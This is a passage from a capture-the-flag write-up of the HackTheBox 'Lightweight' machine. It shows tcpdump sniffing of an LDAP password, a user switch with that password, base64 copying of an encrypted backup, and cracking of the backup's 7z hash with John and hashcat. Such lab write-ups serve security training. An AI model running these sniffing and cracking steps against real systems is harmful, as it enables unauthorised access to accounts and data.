request , maybe we can sniff some useful info. So I ran tcpdump instructing to save the pcap on a file called SittingDucks.pcap: [10.10.14.13@lightweight ~]$ tcpdump -i any -w SittingDucks.pcap tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes Then I opened all the links available on the webpage, that is info.php , status.php , user.php . Then again I stop the tcpdump and I donwload the pcap to my box using scp : m4rc0ff@SittingDucks:~/Documents/htbBoxes/lightweight$ scp 10 .10.14.13@10.10.10.119:~/SittingDucks.pcap . 10.10.14.13@10.10.10.119's password: SittingDucks.pcap Once in Wireshark I noticed an few entries related to the LDAP protocal and after inspecting these I noticed an authentication session for the user ldapuser2 : The yellow highlighed vlue ( 8bc8251332abe1d7f105d3e53ad39ac2 ) is the password used for the \"simple\" authentication. Next, I try to switch user with su using the password just found and I am successful: [10.10.14.13@lightweight ~]$ su ldapuser2 Password: [ldapuser2@lightweight 10.10.14.13]$ Easy enough now to grab the user flag: [ldapuser2@lightweight 10.10.14.13]$ cd /home/ldapuser2 [ldapuser2@lightweight ~]$ ll total 1868 -rw-r--r--. 1 root root 3411 Jun 14 2018 backup.7z -rw-rw-r--. 1 ldapuser2 ldapuser2 1520530 Jun 13 2018 OpenLDAP-Admin-Guide.pdf -rw-rw-r--. 1 ldapuser2 ldapuser2 379983 Jun 13 2018 OpenLdap.pdf -rw-r--r--. 1 root root 33 Jun 15 2018 user.txt [ldapuser2@lightweight ~]$ cat user.txt 8a****************************26 backup files are always interesting so I copy the base64 string of backup.7z : [ldapuser2@lightweight ~]$ base64 -w0 backup.7z && echo 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 and then I paste this in my Kali box, I decode it and put the output on backup.7z . This is simply another way to copy a file over, instead of using scp as we did earlier: m4rc0ff@SittingDucks:~/Documents/htbBoxes/lightweight$ echo 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 | base64 -d > backup.7z Once in my box I try to unzip it: m4rc0ff@SittingDucks:~/Documents/htbBoxes/lightweight$ 7z x backup.7z 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_GB.utf8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Xeon(R) E-2186M CPU @ 2.90GHz (906EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 3411 bytes (4 KiB) Extracting archive: backup.7z -- Path = backup.7z Type = 7z Physical Size = 3411 Headers Size = 259 Method = LZMA2:12k 7zAES Solid = + Blocks = 1 Enter password (will not be echoed): ERROR: Data Error in encrypted file. Wrong password? : index.php ERROR: Data Error in encrypted file. Wrong password? : info.php ERROR: Data Error in encrypted file. Wrong password? : reset.php ERROR: Data Error in encrypted file. Wrong password? : status.php ERROR: Data Error in encrypted file. Wrong password? : user.php Sub items Errors: 5 Archives with Errors: 1 Sub items Errors: 5 but we are prompted for a password. I tried using the ldapuser2 password but it did not work. As shown above the errors disclose the content of the zip. If we crack the zip then we can get our ends to these PHP files which may contain useful information to get root access. First we need to get the hash of the backup.7z file. We can do that with a perl script part of the John framework: m4rc0ff@SittingDucks:~/Documents/htbBoxes/lightweight$ /usr/share/john/7z2john.pl backup.7z && echo backup.7z:$7z$2$19$0$$8$11e96ba400e3926d0000000000000000$1800843918$3152$3140$1ed4a64a2e9a8bc76c59d8160d3bc3bbfd995ce02cf430ea41949ff4d745f6bf3ed238e9f06e98da3446dda53df0abf11902852e4b2a4e32e0b0f12b33af40d351b2140d6266db1a3d66e1c82fa9d516556ec893ba6841f052618ad210593b9975307b98db7e853e3ebfbef6856039647a6ad33a63f5b268fc003c39eba04484beff73264ff8c8fdb8e3bcc94ee0df4feacbba388536663f8feb8b1454890752fba4a7fba484cfd6d1d050aa6233478a2c425566d60630d985d15dae09c7485f92ea271d2087ac837b6f9101465cf4a62b0ee225245871655b1aa16526a2a5d61ab942d1418900fec9da5771da34cb8bf56ec7f05a75cf26a0202a7065b8b020769d244d95e3166fdb9f4557324e090307e91bc7adc7f56f5215ffd1463c7403c5725cbf006b46882439d629a14d4a1e25fafb202a1cfbac837eabf002f7ebfc87f20c67ff847c393a54e5724c29840016fa76be0dfbb73a79fb2ec3f0e9c7b246525acad50d76c3fe31d75004e5bc3e93ce79aab2ddbc91c7ce9666503e3ab8dcaf269d4554baee5276c516d23fabf41610ff4f666ad5cf9dc6dc3bed7e1c0a2767f018ca3cd15a35a1fbefce479b649a5db00263b55c470fcb049327e7aeb849359a74a2444de7a3c025b3a9dbfd597e0cdf642c340982b650d69f2c48b1e6b823b460734f3c6f3c1e3917b6780b0efda60ce5b7d03d55ff1fa0a161b9aa876b7498c8104f28ca6c6c629d6ca47c18e54bb237b62bd813d1cd47fdcd87b9597ddf14aec439185f8b892dedb4bcae949dbab74d72cd45dda311e0f38f219a1887bede5ec6697a8ab9f5cec687e18fd6ef2223015a3d717830f0aff0664e66ed51d185e965b55ce702135eb57f5efca251238f8e66f828c3d28d961dd09f244e735419273700e5ce97b4fa9ee3d5b45f8b81c9d5af1436e70f75dc9657354807bcadcdcf1e4f9432b29d55c21b59de59c933d0d96b0f3b89f871c14691faa63db3bdde5ca78f2c470839d49690d82f5c8334d9a857af449b1cd4c140b1087f41d09fb46baf5f0e7228716f992635e99861621d0e99d9d649ad863d99adab4ba060ef19b18a3dc2c64815401867c852ea17b01a5c551249cef2a234a1d0a91be047e06678a35ebe7256cca9791590bbfc37ee200d173f1c87a585003920ff52fc38f74da83c18284dbf171eda45fb0cba8d3ed09fc9d9e951ff95ae8b3326ec4d2cf6eaaca2890464a424f79718f044b6b7903c0f512744332f615f81e7a965df81f78ae950b98df910660b4c85bbee5b6b9b4eb061868530d1dee292296ac18e0f3081048834129583b2a7fa88573039ec01657642450688464a2e9db9bf9483d105875a30d855fe6c657a81ce5242a2a99887bdc1c786b57916b03a0d3cdddec1a0a8f94e6d9926ebf534a5b28fc4a4e16956941a5eb8718dbca21d9464a4a970b77a5967483f1373c4dc04967b16164d9d9ef6824acfcb63e20913234712b7abbc82f562aea65ef39d2bef6608d887cd5ff67966967a568a3dc21f28ad393d2ab3ca85ff7b87eebd97f80d878e616121bb94020c6fb80f3780c41dba3b4c4c3fceeba9748f4d9a47d3454b491b95bafddefd04afc8b1922e4a87534539d391fb948b59fcc1f5072c0af3c29afbbec26e2dfd7fc6d4e3a19fdb37cd49342bc7ec7526b6594295b341fe6a1a2a5f399eadade6dcb84d87fd3b00a9b79ef6c11cc01f5958a43fbdd2602eb10b4ddaa327ac043ee01c470d3ed2519488e80183043f41968f32283577cb5615de2416fcb9a74b1ce282614f818bc5adef0cb1dd6eb98d74a8d8214ec2a361b246bad656b487e8dce40f4fef808ad818c06ef5a972e2614e51e6b040f491a92ff39d55408cf92ccc0f797f27d8c1f7c5004b5613a660b6f306ba447bb99bbe5a408d00eb2dd4127351097f204e9d277a5eb97330a3d3409c7e097a18639542b1c9efe35eda1b12c1346bc8816a0430f5668a38735567ba09580504de831bb639ab1de7d2afcf2e470cbded2960f3300aca88446ccf0fa27715666e4eb45fe5d6a7a46c414d61e5fbbfd384c53e8bac6805083164332c2bd79d05c4d10436377a35b8402e186efd8959131437840c7b010d7ce74423e08bea80639414dbd0c290ced5bb1adf597b7a76141cc15d3d3054bcc4e9df234be4187725576645e86e0cfb9b7769a8cdefbec5b08d4feda04e8fd437631e181ac89deec9c54105a32776a2cb8f068177aabc375359e5b38ae4eb8cebf0668f5d104a5c5929c890c7d1de0694063943b844cd8f274b6f6bcbe004b3fe54e52905200e5b024a02498a1f767758e910516c7c295a552802e47d699cdd98adea07bd4f53f745342b990067339b9a0a2ab0c6ea2c0210961b96c7c22b2daaa322de7fddc91527d118c45d4a2a08a2c37a85a7b665ab4ba625b983019085b32096c78ed8a760c83fbf6c5811b7b16681b0a61513686d6810c72d0f1c30b792b1948a478ad660a4036fcd5dbfc57b352a22a4ed27daf1f8455aa9d81a5b8b28287fea4342c14bd42cf3159c830d322d166958a6e233ca7b9dd2914fce1f2621f95998e83df69bee22f70ae086f242690631fcd33730bb2e5ad64fa7d0b7b93931957311eeaa9b45382d020e85856e456712da51a9c220226d2a177e758ea6b7631647cc8419d04fb6b5dab40a841ba9d5660a550ac817af679f3c1a266b9c657372988ab38cfb6971695c59b5454fdf7ca1170066b99c06c985fb8564eed4caade040ef9320d5198041a2bfc62b4b21eb080520628ed3c8c8a2ffd8e0073b24c2059815da86f1b682622e714124950ff26ad79bf31897331fc23cd075fb1f4822046273b0898bebc1ba23110d74ed459c0c0f12488f0b51310f59c9dae537cdda5a75d48a4ac544531fba92fd6dbaa018cb3cc69ee4b9859f3fa1e022d4850bfd995afa9d70273789084f5955a30df3cf7de7f45c2601fe1ee0adbc89dbbd1aa23badcdfcc9d95e2bfd6f102c92bd1fb9648f446a98ab16302049f6862a0da1c758d0f0a7763e9ac0cdda94bed47f98103f8e068cd12bc83bb9a2bd2be19593d64a2f1034cdad6fbee498488a5b37efebcfe667393cf91c1a4d00082ea8463d57e691a0fb3b2394090dab00bb00d27b418b0db0171da74b6d314b78d951ec5ec87eff81800a0f41bb5eb01d5d116183667e1762c4a1d19631c05a61e1be0f05e5188da27df1a0d8697119fbe29693d776ce50c7896a3bc52888ebdcec056a4d7e675af2ea8de25f52e0470e053dd6614b3548ad0cd282a76d397b7e2fedc98d975003bd29feebc53ee5b412088599ac203cb8b6be1f3a0414511391b3495d175b3dfda7990753255ff0f13eb86ce97b5c6925aa31868523c325548720179c69e0e8df8407f5e87f263acd024cc5c4f5a75ef7a6fc1a3b650257fca20aa00674f35a07dac72471bbb500152b51dfe1743b797ad61110aa76b9fe69c0a02506ba4a6fc0b4a202efb9d88dfba38e5b5352046022cc17b57bdb40153db6b97e2f344d2c4598c0d021044eeb01423f6f6ade5702e10b63782fedddbaeba1dd9f9725eb3f85584fce2319b24851d7ec3ba2c2774741683b383ec97aadb7c912d655b6e5b147c33bb1856623b8ca08f092c0677d56e1dde99aa31ab30a654c57828536a120b4e4835ca6c7b5a2243bddfb9a00750521c74654a281cb12c806437030cd577907a797dc63a3959d47b68119a32a229899be06b7979c14b2c98e75667b8c5d30f0dfedd9553ba894ad9acda62f7f607bb35c080c3a440108ac0ce45f1873c5873488f2901790b08cb4928932a1c479d89ded5f6ce9f16c297e9dcc33c6b882b26c53b7a4f2b390367e36e384c1eb9805c0471aad4f77496e8f4fd447448dd59536629a645d04956fc30bcc686718e8d4d7cfc9ecbef3745af038de55826d328b7bad4a2eb7a10faf09c0618fd90d1941e8e3274bcd6eb2d8bed430ebfe6e8682b60390d79161f3a349c73de552d40f7421e5c4b4de80feb3998eb4ce6ecaef9bd2768e8be6534cd12ac163e70d3ed23963801c04770610c91f1ffcf4cbdf2a733f51e6fd596c855c0b905822a3838a82ea2d0e51dd442c451d05c6aa1b0099883db543927c0cc4016e27bb1b17fe863ae0c18458edbccdd6b15f0b73c3dc8c672c1bbbd81f290e9bb5291192143945d58757f64eceebd88e467d48b54a25cee7ed75263a4bb5d5597b9b5b75b6c254f81871f18246d2d91f664a0f49c1f67940d792d225272e713259f3135e5c286e081b1e2331f9217de1c0c9109d7a898458be85a4c130ea6e8c0db4dc5dbf77da5045f7da647c66e5af5676bb15221d5152da551a9390fda92e3539fde7afbd04e2e710ef28b5d5e50f2fdac106c9a18ef02414fb466f50f52b6e88e336ffe4fa929d9548630f3d7fb7d50ea590b2e3bdc3a88cf9d7f6b30f07d28ddf28c15c5371eb$4218$ 03 We can see there is a backup.7z: at the beginning of the file. We need to remote that bit and I also put the whole thing into a file called backup.hash Then use hashcat to crack the hash, but first I need the hash mode which I can find with this command: m4rc0ff@SittingDucks:~/Documents/htbBoxes/lightweight$ hashcat --example-hashes | grep -i 7 -zip -B2 -A2 MODE: 11600 TYPE: 7-Zip HASH: $7z$0$14$0$$11$33363437353138333138300000000000$2365089182$16$12$d00321533b483f54a523f624a5f63269 PASS: hashcat Now that we have the mode we can crack it: m4rc0ff@SittingDucks:~/Documents/htbBoxes/lightweight$ hashcat -m 11600 backup.hash /usr/share/wordlists/rockyou.txt --force hashcat (v6.0.0) starting... <SNIP> Host memory required for this attack: 64 MB Dictionary cache built: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344392 * Bytes.....: 139921507 * Keyspace..: 14344385 * Runtime...: 1 sec <SNIP> 808ad818c06ef5a972e2614e51e6b040f491a92ff39d55408cf92ccc0f797f27d8c1f7c5004b5613a660b6f306ba447bb99bbe5a408d0006c9a18ef02414fb466f50f52b6e88e336ffe4fa929d9548630f3d7fb7d50ea590b2e3bdc3a88cf9d7f6b30f07d28ddf28c15c5371eb$4218$03:delete <SNIP> Started: Tue Jun 23 14:08:06 2020 Stopped: Tue Jun 23 14:09:35 2020 As shown above, we can see the hash has been cracked 